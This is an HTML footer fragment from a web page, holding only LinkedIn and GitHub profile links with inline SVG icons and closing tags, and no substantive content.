<a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
<a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
</div></div></div></div></footer></body></html>